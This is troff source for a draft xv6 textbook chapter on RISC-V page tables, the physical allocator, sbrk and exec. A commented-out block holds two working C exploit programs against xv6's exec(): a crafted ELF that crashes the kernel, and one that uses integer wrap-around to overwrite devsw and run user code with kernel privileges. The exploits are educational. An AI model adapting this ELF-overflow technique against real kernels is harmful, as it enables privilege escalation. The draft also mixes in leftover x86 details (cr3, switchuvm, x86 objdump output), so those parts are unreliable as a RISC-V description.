.ig
talk a little about initial page table conditions:
    paging not on, but virtual mostly mapped direct to physical,
    which is what things look like when we turn paging on as well
    since paging is turned on after we create first process.
  mention why still have SEG_UCODE/SEG_UDATA?
  do we ever really say what the low two bits of %cs do?
    in particular their interaction with PTE_U
  sidebar about why it is extern char[]
..
.chapter CH:MEM "Page tables"
.PP
Page tables are the mechanism through which the operating system
provides each process with its own private memory.  Page tables
determinate what memory addresses mean.  They allow xv6 to multiplex
the address spaces of different processes onto a single physical
memory, and to protect the memories of different processes.  The level
of indirection provided by page tables also allows many neat tricks.
.PP
xv6 uses page tables primarily to multiplex address spaces and to
protect memory.  It also uses a few simple page-table tricks: mapping
the same memory (a trampoline page) in several address spaces, and
guarding a user stack with an unmapped page.  The rest of this chapter
explains the page tables that the RISC-V hardware provides and how xv6
uses them.  Compared to a real-world operating system, xv6's design is
restrictive, but it does illustrate the key ideas.
.\"
.section "Paging hardware"
.\"
As a reminder,
RISC-V instructions (both user and kernel) manipulate virtual addresses.
The machine's RAM, or physical memory, is indexed with physical
addresses.
The RISC-V page table hardware connects these two kinds of addresses,
by mapping each virtual address to a physical address.
.PP
xv6 runs on Sv39 RISC-V processor with has 39-bit virtual addresses;
the top of 25 bits of a 64-bit virtual address are unused.  In this
configuration, a RISC-V page table is logically an array of 2^27
(134,217,728)
.italic-index "page table entries (PTEs)".
Each PTE contains a
44-bit physical page number (PPN) and some flags. The paging
hardware translates a virtual address by using the top 27 bits
of the 39 bits to index into the page table to find a PTE, and
making a 56-bit physical address by setting
the address's top 44 bits with the PPN in the PTE.  The paging hardware
copies the low 12 bits unchanged from the virtual to the
translated physical address.  Thus a page table gives
the operating system control over virtual-to-physical address translations
at the granularity of aligned chunks of 4096 (2^12) bytes.
Such a chunk is called a
.italic-index page .
.figure riscv_pagetable
.PP
As shown in
.figref riscv_pagetable ,
the actual translation happens in three steps.  A page table is stored
in physical memory as a three-level tree.
The root of the tree is a
4096-byte page that contains 512 PTEs, which contains the physical
addresses for pages for the next level in the tree.  Each one of those
pages contains 512 PTEs for the final level in the tree.  The paging
hardware uses the top 9 bits of the 27 bits to select a PTE in the
root page, the middle 9 bits to select a PTE in next level of the
tree, and the bottom 9 bits to select the final PTE.
.PP
If any of the PTEs is not present, the paging hardware raises a fault.
This three-level structure allows a page table to omit entire page
table pages in the common case in which large ranges of virtual
addresses have no mappings.
.PP
In Sv39 RISC-V processors, the top 25 bits of virtual address are not
used for translation; in the future, RISC-V can use those bits to
define more levels of translation.  Similarly, the physical address
has room for growth; in Sv39 it is 56 bits, but could grow to 64 bits.
.PP
Each PTE contains flag bits that tell the paging hardware
how the associated virtual address is allowed to be used.
.code-index PTE_V
indicates whether the PTE is present: if it is
not set, a reference to the page causes a fault (i.e. is not allowed).
.code-index PTE_R
controls whether instructions are allowed to issue
reads to the page.
.code-index PTE_W
controls whether instructions are allowed to issue
writes to the page.
.code-index PTE_X
controls whether the processor may interpret the content
of the page as instruction and execute them.
.figref riscv_pagetable
shows how it all works.
The flags and all other page hardware related structures are defined in
.file "kernel/riscv.h"
.sheet kernel/riscv.h .
.PP
To tell the hardware to use a page table, the kernel must
write the physical address of the root page into the register
.register satp .
Each processor has its own
.register satp .
A processor will translate all addresses in subsequent instructions
using its page table.
Each processor has its own page-table register so that one processor
can run one process concurrently with another processor running
another process, with their memories isolated from each other.
.PP
A few notes about terms.
Physical memory refers to storage cells in DRAM.
A byte of physical memory has an address, called a physical address.
Instructions use only virtual addresses, which the
paging hardware translates to physical addresses, and then
sends to the DRAM hardware to read or write storage.
At this level of discussion there is no such thing as virtual memory,
only virtual addresses.
.figure xv6_layout
.\"
.section "Kernel address space"
.\"
The kernel has its own page table.  When a process enters kernel
space, xv6 switches to the kernel page table, and when the kernel
returns to user space, it switches to the page table of the user
process.  The memory of the kernel is private.
.PP
.figref xv6_layout
shows the layout of the kernel address space, and the mapping from
virtual addresses to physical addresses.  The file
.file "kernel/memlayout.h"
.sheet kernel/memlayout.h
declares the constants for xv6's kernel memory layout.
.PP
The RISC-V development board has a number of
.italic-index "memory-mapped"
devices that sit below
.address 0x80000000
in physical memory. The particular addresses are chosen by the board's
manufacturer.  The kernel can interact with devices by reading/writing
memory locations, and the board routes those reads and writes to the
appropriate devices. For example, as we saw in Chapter \*[CH:FIRST], the kernel
programmed the CLINT to generate clock interrupts.  We will
see later how xv6 interacts with the other devices.
.PP
The kernel uses an identity mapping for most virtual addresses.  For,
example, the kernel itself is located at
.code KERNBASE
in the virtual address space and in physical memory.  Same for all
devices.  The one exception is the page holding trampoline code, which
is mapped at the top of virtual address space; user page tables have
this same mapping.  In chapter \*[CH:TRAP], we will discuss the role
of the trampoline page, but we see here an interesting use case of
page tables; a physical page (holding the trampoline code) is
mapped twice in the virtual address space of the kernel: once at top
of the virtual address space and once in the kernel text.
.PP
The kernel maps the pages for the trampoline and the kernel text with
the permissions
.code PTE_R
and
.code PTE_X .
The kernel reads and executes instructions from these pages.
The kernel maps the other pages with the permissions
.code PTE_R
and
.code PTE_W ,
so that it read and write the memory in those pages.
.\"
.section "Process address space"
.\"
.PP
Each process has a separate page table, and when xv6 switches between
processes, xv6 also changes page tables.
As shown in
.figref first:as ,
a process's user memory starts at virtual address
zero and can grow up to
.address MAXVA
.line kernel/riscv.h:/MAXVA/ ,
allowing a process to address in principle 256 Gigabyte of memory.
.PP
When a process asks xv6 for more memory,
xv6 first finds free physical pages in the area
labeled "Free memory", the area above the end of the data segment
of the kernel and below
.address PHYSTOP .
It then adds PTEs to the process's page table that point
to the new physical pages.
xv6 sets the
.code PTE_W ,
.code PTE_X ,
.code PTE_R ,
.code PTE_U ,
and
.code PTE_V
flags in these PTEs.
Most processes do not use the entire user address space;
xv6 leaves
.code PTE_V
clear in unused PTEs.
.PP
We see here a few nice examples of use of page tables.  First,
different processes' page tables translate user addresses to different
pages of physical memory, so that each process has private user
memory.  Second, each process sees its memory as having contiguous
virtual addresses starting at zero, while the process's physical
memory can be non-contiguous.  Third, the kernel maps the page with
trampoline code also at the top of address space of user processes,
thus a single page of physical memory shows up in all address spaces.
.\"
.section "Code: creating an address space"
.\"
.PP
.code-index main
calls
.code-index kvminit
.line kernel/vm.c:/^kvminit/
to create the kernel page table.
.code Kvminit
first allocates a page of memory to hold the page directory.
Then it calls
.code-index mappages
to install the translations that the kernel needs.
The translations include the kernel's
instructions and data, physical memory up to
.code-index PHYSTOP ,
and memory ranges which are actually devices.
.PP
.code-index mappages
.line kernel/vm.c:/^mappages/
installs mappings into a page table
for a range of virtual addresses to
a corresponding range of physical addresses.
It does this separately for each virtual address in the range,
at page intervals.
For each virtual address to be mapped,
.code mappages
calls
.code-index walk
to find the address of the PTE for that address.
It then initializes the PTE to hold the relevant physical page
number, the desired permissions (e.g.,
.code PTE_W
.code PTE_X ,
and/or
.code PTE_R ),
and
.code PTE_V
to mark the PTE as valid
.line kernel/vm.c:/perm...PTE_V/ .
.PP
.code-index walk
.line kernel/vm.c:/^walk/
mimics the actions of the RISC-V paging hardware as it
looks up the PTE for a virtual address (see
.figref riscv_pagetable ).
.code walk
traverses the 3-level page table down 9 bits at the time.
It uses the level's 9 bits of the virtual address to find
the PTE
.line kernel/vm.c:/pte.=..pagetable/ .
If the PTE isn't valid, then
the required page hasn't yet been allocated;
if the
.code alloc
argument is set,
.code walk
allocates it and puts its physical address in the PTE.
It returns the PTE in lowest layer in the tree
.line kernel/vm.c:/return..pagetable/ .
.PP
.code-index main
calls
.code-index kvminithart
.line kernel/vm.c:/^kvminithart/
to install the kernel page table.
It writes the physical address of the root page
into the register
.register satp.
After this the processor will translate addresses using the kernel
page table.  Since the kernel uses an identity mapping, the now
virtual address of the next instruction will map to the right physical
memory address.
.\"
.section "Physical memory allocation"
.\"
.PP
The kernel must allocate and free physical memory at run-time for
page tables,
process user memory,
kernel stacks,
and pipe buffers.
.PP
xv6 uses the physical memory between the end of the kernel and
.code-index PHYSTOP
for run-time allocation. It allocates and frees whole 4096-byte pages
at a time. It keeps track of which pages are free by threading a
linked list through the pages themselves. Allocation consists of
removing a page from the linked list; freeing consists of adding the
freed page to the list.
.\"
.section "Code: Physical memory allocator"
.\"
.PP
The allocator's data structure is a
.italic "free list"
of physical memory pages that are available
for allocation.
Each free page's list element is a
.code-index "struct run"
.line kernel/kalloc.c:/^struct.run/ .
Where does the allocator get the memory
to hold that data structure?
It store each free page's
.code run
structure in the free page itself,
since there's nothing else stored there.
The free list is
protected by a spin lock
.line 'kernel/kalloc.c:/^struct.{/,/}/' .
The list and the lock are wrapped in a struct
to make clear that the lock protects the fields
in the struct.
For now, ignore the lock and the calls to
.code acquire
and
.code release ;
Chapter \*[CH:LOCK] will examine
locking in detail.
.PP
The function
.code-index main
calls
.code-index kinit
to initialize the allocator
.line kernel/kalloc.c:/^kinit/ .
.code kinit
enables locking and arranges for more memory to be allocatable.
.code main
ought to determine how much physical
memory is available by parsing configuration information.
Instead xv6 assumes that the machine has
224 megabytes
.code PHYSTOP ) (
of physical memory, and uses all the memory between the end of the kernel
and
.code-index PHYSTOP
as the initial pool of free memory.
.code kinit
calls
.code-index freerange
to add memory to the free list via per-page calls to
.code-index kfree .
A PTE can only refer to a physical address that is aligned
on a 4096-byte boundary (is a multiple of 4096), so
.code freerange
uses
.code-index PGROUNDUP
to ensure that it frees only aligned physical addresses.
The allocator starts with no memory;
these calls to
.code kfree
give it some to manage.
.PP
The allocator sometimes treats addresses as integers
in order to perform arithmetic on them (e.g.,
traversing all pages in
.code kinit ),
and sometimes uses addresses as pointers to read and
write memory (e.g., manipulating the
.code run
structure stored in each page);
this dual use of addresses is the main reason that the
allocator code is full of C type casts.
.index "type cast"
The other reason is that freeing and allocation inherently
change the type of the memory.
.PP
The function
.code kfree
.line kernel/kalloc.c:/^kfree/
begins by setting every byte in the
memory being freed to the value 1.
This will cause code that uses memory after freeing it
(uses ``dangling references'')
to read garbage instead of the old valid contents;
hopefully that will cause such code to break faster.
Then
.code kfree
casts
.code v
to a pointer to
.code struct
.code run ,
records the old start of the free list in
.code r->next ,
and sets the free list equal to
.code r .
.code-index kalloc
removes and returns the first element in the free list.
.\"
.section "User part of an address space"
.\"
.figure processlayout
.PP
.figref processlayout
shows the layout of the user memory of an executing process in xv6.
Each user process starts at address 0. The bottom of the address space
contains the text for the user program, its data, and its stack.
The heap is above the stack so that the heap can expand when the process
calls
.code-index sbrk .
Note that the text, data, and stack sections are layed out contiguously in the
process's address space but xv6 is free to use non-contiguous physical pages for
those sections. For example, when xv6 expands a process's heap, it can use any
free physical page for the new virtual page and then program the page table
hardware to map the virtual page to the allocated physical page.  This
flexibility is a major advantage of using paging hardware.
.PP
The stack is a single page, and is
shown with the initial contents as created by exec.
Strings containing the command-line arguments, as well as an
array of pointers to them, are at the very top of the stack.
Just under that are values that allow a program
to start at
.code main
as if the function call
.code main(argc,
.code argv)
had just started.
To guard a stack growing off the stack page, xv6 places a guard page right below
the stack.  The guard page is not mapped and so if the stack runs off the stack
page, the hardware will generate an exception because it cannot translate the
faulting address.
A real-world operating system might allocate more space for the stack so that it can
grow beyond one page.
.\"
.section "Code: sbrk"
.\"
.code Sbrk
is the system call for a process to shrink or grow its memory. The system
call is implemented by the function
.code growproc
.line kernel/proc.c:/^growproc/ .
If
.code n
is postive,
.code growproc
allocates one or more physical pages and maps them at the top of the process's
address space.  If
.code n
is negative,
.code growproc
unmaps one or more pages from the process's address space and frees the corresponding
physical pages.
To make these changes,
.code
xv6 modifies the process's page table.  The process's page table is stored in
memory, and so the kernel can update the table with ordinary assignment
statements, which is what
.code allocuvm
and
.code deallocuvm
do.
The RISC-V hardware caches page table entries in a
.italic-index "Translation Look-aside Buffer (TLB)" ,
and when xv6 changes the page tables, it must invalidate the cached entries.  If
it didn't invalidate the cached entries, then at some point later the TLB might
use an old mapping, pointing to a physical page that in the mean time has been
allocated to another process, and as a result, a process might be able to
scribble on some other process's memory.
.code Growproc
invalidates stale cached entries by calling
.code switchuvm ,
which reloads
.register cr3 ,
the register that holds the address of the current page table.
Reloading
.register cr3
invalidates all entries in the TLB.
.\"
.section "Code: exec"
.\"
.code Exec
is the system call that creates the user part of an address space.  It
initializes the user part of an address space from a file stored in the file
system.
.code Exec
.line kernel/exec.c:/^exec/
opens the named binary
.code path
using
.code-index namei
.line kernel/exec.c:/namei/ ,
which is explained in Chapter \*[CH:FS].
Then, it reads the ELF header. Xv6 applications are described in the widely-used
.italic-index "ELF format" ,
defined in
.file kernel/elf.h .
An ELF binary consists of an ELF header,
.code-index "struct elfhdr"
.line kernel/elf.h:/^struct.elfhdr/ ,
followed by a sequence of program section headers,
.code "struct proghdr"
.line kernel/elf.h:/^struct.proghdr/ .
Each
.code proghdr
describes a section of the application that must be loaded into memory;
xv6 programs have only one program section header, but
other systems might have separate sections
for instructions and data.
.PP
The first step is a quick check that the file probably contains an
ELF binary.
An ELF binary starts with the four-byte ``magic number''
.code 0x7F ,
.code 'E' ,
.code 'L' ,
.code 'F' ,
or
.code-index ELF_MAGIC
.line kernel/elf.h:/ELF_MAGIC/ .
If the ELF header has the right magic number,
.code exec
assumes that the binary is well-formed.
.PP
.code Exec
allocates a new page table with no user mappings with
.code-index setupkvm
.line kernel/exec.c:/setupkvm/ ,
allocates memory for each ELF segment with
.code-index allocuvm
.line kernel/exec.c:/allocuvm/ ,
and loads each segment into memory with
.code-index loaduvm
.line kernel/exec.c:/loaduvm/ .
.code allocuvm
checks that the virtual addresses requested
is below
.address KERNBASE .
.code-index loaduvm
.line kernel/vm.c:/^loaduvm/
uses
.code-index walkpgdir
to find the physical address of the allocated memory at which to write
each page of the ELF segment, and
.code-index readi
to read from the file.
.PP
The program section header for
.code-index /init ,
the first user program created with
.code exec ,
looks like this:
.P1
# objdump -p _init
_init:     file format elf64-x86-64

Program Header:
    LOAD off    0x00000000000000b0 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000001061 memsz 0x0000000000001088 flags rwx
   STACK off    0x0000000000000000 vaddr 0x0000000000000000 paddr 0x0000000000000000 align 2**4
         filesz 0x0000000000000000 memsz 0x0000000000000000 flags rwx
.P2
.PP
The program section header's
.code filesz
may be less than the
.code memsz ,
indicating that the gap between them should be filled
with zeroes (for C global variables) rather than read from the file.
For
.code /init ,
.code filesz
is 4193 bytes and
.code memsz
is 4232 bytes,
and thus
.code-index allocuvm
allocates enough physical memory to hold 4232 bytes, but reads only 4193 bytes
from the file
.code /init .
.PP
.PP
Now
.code-index exec
allocates and initializes the user stack.
It allocates just one stack page.
.code Exec
copies the argument strings to the top of the stack
one at a time, recording the pointers to them in
.code-index ustack .
It places a null pointer at the end of what will be the
.code-index argv
list passed to
.code main .
The first three entries in
.code ustack
are the fake return PC,
.code-index argc ,
and
.code argv
pointer.
.PP
.code Exec
places an inaccessible page just below the stack page,
so that programs that try to use more than one page will fault.
This inaccessible page also allows
.code exec
to deal with arguments that are too large;
in that situation,
the
.code-index copyout
.line kernel/vm.c:/^copyout/
function that
.code exec
uses to copy arguments to the stack will notice that
the destination page is not accessible, and will
return \-1.
.PP
During the preparation of the new memory image,
if
.code exec
detects an error like an invalid program segment,
it jumps to the label
.code bad ,
frees the new image,
and returns \-1.
.code Exec
must wait to free the old image until it
is sure that the system call will succeed:
if the old image is gone,
the system call cannot return \-1 to it.
The only error cases in
.code exec
happen during the creation of the image.
Once the image is complete,
.code exec
can install the new image
.line kernel/exec.c:/switchuvm/
and free the old one
.line kernel/exec.c:/freevm/ .
Finally,
.code exec
returns 0.
.PP
.PP
.code Exec
loads bytes from the ELF file into memory at addresses specified by the ELF file.
Users or processes can place whatever addresses they want into an ELF file.
Thus
.code exec
is risky, because the addresses in the ELF file may refer to the kernel, accidentally
or on purpose. The consequences for an unwary kernel could range from
a crash to a malicious subversion of the kernel's isolation mechanisms
(i.e., a security exploit).
xv6 performs a number of checks to avoid these risks.
To understand the importance of these checks, consider what could happen
if xv6 didn't check
.code "if(ph.vaddr + ph.memsz < ph.vaddr)" .
This is a check for whether the sum overflows a 64-bit integer.
The danger is that a user could construct an ELF binary with a
.code ph.vaddr
that points into the kernel,
and
.code ph.memsz
large enough that the sum overflows to 0x1000.
Since the sum is small, it would pass the check
.code "if(newsz >= KERNBASE)"
in
. code allocuvm .
The subsequent call to 
.code loaduvm
passes
.code ph.vaddr
by itself, without adding
.code ph.memsz 
and without checking
.code ph.vaddr
against
.code KERNBASE ,
and would thus copy data from the ELF binary into the kernel.
This could be exploited by a user
program to run arbitrary user code with kernel privileges.  As this example
illustrates, argument checking must be done with great care.
It is easy for a kernel developer to omit a crucial check, and
real-world kernels have a long history of missing checks whose absence
can be exploited by user programs to obtain kernel privileges.  It is likely that xv6 doesn't do a complete job of validating
user-level data supplied to the kernel, which a malicious user program might be able to exploit to circumvent xv6's isolation.
.ig
Example exploit (due to mikecat).

The exec() function in file exec.c had two vulnerabilities.

denial of service via misaligned virtual address
arbitrary code execution using wrapping in calculation of VM size
This user application is a exploit code for the first vulnerability.

#include "types.h"
#include "user.h"
#include "fcntl.h"

void elfgen(char *name) {
  static char magic[] = {
    127,69,76,70,1,1,1,0,0,0,0,0,0,0,0,0,2,0,3,0,1,0,0,0,7,0,0,0,52,0,0,0,
    84,0,0,0,0,0,0,0,52,0,32,0,1,0,40,0,3,0,2,0,1,0,0,0,204,0,0,0,7,0,0,0,
    7,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
    1,0,0,0,6,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,7,0,0,0,
    3,0,0,0,0,0,0,0,0,0,0,0,211,0,0,0,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,116,0,46,115,116,114,116,97,98,0
  };
  int fd;
  fd = open(name, O_CREATE | O_WRONLY);
  if(fd == -1) {
    printf(2, "open failed\n");
    exit();
  }
  write(fd, magic, sizeof(magic));
  close(fd);
}

int main(void) {
  char name[] = "unaligned";
  char *argv[2] = {name, 0};
  elfgen(name);
  exec(name, argv);
  printf(2, "exec failed\n");
  exit();
}
This program create ELF having vaddr which isn't multiple of PGSIZE and have the system read it via exec system call.
Then, the misaligned virtual address is padded to loaduvm() and it leads to panic.

This user application is a exploit code for the second vulnerability.

#include "types.h"
#include "user.h"
#include "fcntl.h"

/* Please see kernel.sym and set
 *   DEVSW_ADDR = the address of devsw
 *   PANIC_ADDR = the address of panic
 */
#define DEVSW_ADDR 0x801111c0u
#define PANIC_ADDR 0x8010053du

void shellcode(void*, char*, int);

void set4bytes(char *p, uint data) {
  int i;
  for (i = 0; i < 4; i++) p[i] = (data >> (8 * i));
}

void elfgen(char *name) {
  static char magic[] = {
    127,69,76,70,1,1,1,0,0,0,11,0,0,0,0,0,2,0,3,0,1,0,0,0,0,0,0,0,52,0,0,0,
    126,0,0,0,0,0,0,0,52,0,32,0,3,0,40,0,2,0,2,0,1,0,0,0,236,0,0,0,0,0,0,0,
    0,0,0,0,7,0,0,0,7,0,0,0,5,0,0,0,0,16,0,0,1,0,0,0,2,1,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
    1,0,0,0,6,0,0,0,0,0,0,0,236,0,0,0,7,0,0,0,0,0,0,0,0,0,0,0,0,16,0,0,
    0,0,0,0,7,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,19,1,0,0,15,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,184,2,0,0,0,205,64,0,46,116,101,120,
    116,0,46,115,116,114,116,97,98,0
  };
  static char bomb[(DEVSW_ADDR & 0xfff) + 4] = {0};
  int fd;
  fd = open(name, O_CREATE | O_WRONLY);
  if(fd == -1) {
    printf(2, "open failed\n");
    exit();
  }

  /* address of the program to execute */
  set4bytes(bomb + (DEVSW_ADDR & 0xfff), (uint)shellcode);
  /* address of bomb */
  set4bytes(magic + 0x5C, DEVSW_ADDR & 0xfffff000u);
  /* size of bomb */
  set4bytes(magic + 0x64, sizeof(bomb));
  /* size on memory of bomb */
  set4bytes(magic + 0x68, 0x1000 - (DEVSW_ADDR & 0xfffff000u));

  /* ELF data */
  write(fd, magic, sizeof(magic));
  /* bomb */
  write(fd, bomb, sizeof(bomb));

  close(fd);
}

int main(void) {
  char name[] = "devswhack";
  char *argv[2] = {name, 0};
  int pid;
  elfgen(name);
  pid = fork();
  if (pid == -1) {
    printf(2, "fork failed\n");
  } else if (pid == 0) {
    exec(name, argv);
    printf(2, "exec failed\n");
  } else {
    int fd;
    wait();
    mknod("shellcode", 0, 0);
    fd = open("shellcode", O_RDONLY);
    if (fd < 0) {
      printf(2, "open failed\n");
    } else {
      read(fd, 0, 1);
      close(fd);
    }
  }
  exit();
}

void shellcode(void* a, char* b, int c) {
  void (*panic)(char*) = (void(*)(char*))PANIC_ADDR;
  panic("vulnerable");

  /* avoid warnings for unused arguments */
  (void)a; (void)b; (void)c;
}
This program generates an ELF and have the system load it via exec system call.
In loading this ELF, one of ph.vaddr + ph.memsz becomes 0x1000 due to integer wrapping.
ph.vaddr is pointing at the kernel data, and loaduvm() will overwrite there.
devsw[0].read will be overwritten by the address of shellcode() via this loading, and after that,
when this process use read system call for special file with major = 0,
the function shellcode(), which is created by a user, will be executed according to the overwritten devsw.
..
.PP
.\"
.section "Real world"
.\"
.PP
Like most operating systems, xv6 uses the paging hardware
for memory protection and mapping.
Most operating systems make far more sophisticated
use of paging than xv6; for example, xv6 lacks demand
paging from disk, copy-on-write fork, shared memory,
lazily-allocated pages,
and automatically extending stacks.
.PP
XXXX
The RISC-V support physical memory protection, but xv6 doesn't use it.

The x86 supports address translation using segmentation (see Appendix \*[APP:BOOT]),
but xv6 uses segments only for the common trick of
implementing per-cpu variables such as
.code proc
that are at a fixed address but have different values
on different CPUs (see
.code-index seginit ).
Implementations of per-CPU (or per-thread) storage on non-segment
architectures would dedicate a register to holding a pointer
to the per-CPU data area, but the x86 has so few general
registers that the extra effort required to use segmentation
is worthwhile.
.PP
Xv6 maps the kernel in the address space of each user process but sets it up so
that the kernel part of the address space is inaccessible when the processor is
in user mode.  This setup is convenient because after a process switches from
user space to kernel space, the kernel can easily access user memory by reading
memory locations directly.  It is probably better for security, however, to have
a separate page table for the kernel and switch to that page table when entering
the kernel from user mode, so that the kernel and user processes are more
separated from each other.  This design, for example, would help mitigating
side-channels that are exposed by the Meltdown vulnerability and that allow a
user process to read arbitrary kernel memory.
.PP
On machines with lots of memory
it might make sense to use
the x86's 4-megabytes ``super pages.''
Small pages make sense
when physical memory is small, to allow allocation and page-out to disk
with fine granularity.
For example, if a program
uses only 8 kilobytes of memory, giving it a 4 megabytes physical page is wasteful.
Larger pages make sense on machines with lots of RAM,
and may reduce overhead for page-table manipulation.
.PP
Xv6 should determine the actual RAM configuration, instead
of assuming 224 MB.
On the x86, there are at least three common algorithms:
the first is to probe the physical address space looking for
regions that behave like memory, preserving the values
written to them;
the second is to read the number of kilobytes of
memory out of a known 16-bit location in the PC's non-volatile RAM;
and the third is to look in BIOS memory
for a memory layout table left as
part of the multiprocessor tables.
Reading the memory layout table
is complicated.
.PP
Memory allocation was a hot topic a long time ago, the basic problems being
efficient use of limited memory and
preparing for unknown future requests;
see Knuth.  Today people care more about speed than
space-efficiency.  In addition, a more elaborate kernel
would likely allocate many different sizes of small blocks,
rather than (as in xv6) just 4096-byte blocks;
a real kernel
allocator would need to handle small allocations as well as large
ones.
.\"
.section "Exercises"
.\"
.PP
1. Look at real operating systems to see how they size memory.
.PP
2. Write a user program that grows its address space with 1 byte by calling
.code sbrk(1) .
Run the  program and investigate the page table for the program before the call
to
.code sbrk
and after the call to
.code sbrk .
How much space has the kernel allocated?  What does the
.code pte
for the new memory contain?
.PP
3. Modify xv6 so that the pages for the kernel are shared among processes, which
reduces memory consumption.
.PP
4. Modify xv6 so that when a user program dereferences a null pointer, it will
receive a fault.  That is, modify xv6 so that virtual address 0 isn't mapped for
user programs.
.PP
5. Unix implementations of
.code exec
traditionally include special handling for shell scripts.
If the file to execute begins with the text
.code #! ,
then the first line is taken to be a program
to run to interpret the file.
For example, if
.code exec
is called to run
.code myprog
.code arg1
and
.code myprog 's
first line is
.code #!/interp ,
then
.code exec
runs
.code /interp
with command line
.code /interp
.code myprog
.code arg1 .
Implement support for this convention in xv6.
.PP
6. Delete the check
.code "if(ph.vaddr + ph.memsz < ph.vaddr)"
in
.code exec.c ,
and construct a user  program that exploits that the check is missing.
.PP
7. Change xv6 to use super pages to reduce the number of mappings for the kernel.
.PP
8. Change xv6 so that user processes run with only a minimal part of the kernel
mapped and so that the kernel runs with its own page table that doesn't include
the user process.

